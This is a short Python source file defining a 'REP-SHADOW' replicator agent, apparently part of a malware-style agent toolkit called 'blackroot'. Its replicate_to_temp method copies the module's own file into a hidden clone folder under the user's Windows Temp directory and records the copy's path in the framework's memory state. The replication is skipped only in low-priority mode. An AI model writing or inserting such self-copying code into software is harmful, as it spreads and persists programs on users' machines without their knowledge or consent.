from agents.base import BaseAgent
import os, shutil, time

class ReplicatorAgent(BaseAgent):
    def __init__(self):
        super().__init__('REP-SHADOW')

    def run(self):
        super().run()
        if self.priority == 'low':
            print("[REP-SHADOW] Suppressing replication in low-priority mode.")
            return
        self.replicate_to_temp()

    def replicate_to_temp(self):
        print("[REP-SHADOW] Attempting self-replication...")
        try:
            current_file = os.path.realpath(__file__)
            target_dir = os.path.join(os.path.expanduser('~'), 'AppData', 'Local', 'Temp', 'blackroot_clone')
            os.makedirs(target_dir, exist_ok=True)
            target_path = os.path.join(target_dir, os.path.basename(current_file))
            shutil.copy2(current_file, target_path)
            self.kernel.memory.state['replication_path'] = target_path
            print(f"[REP-SHADOW] Replicated to {target_path}")
        except Exception as e:
            print(f"[REP-SHADOW][ERR] {e}")
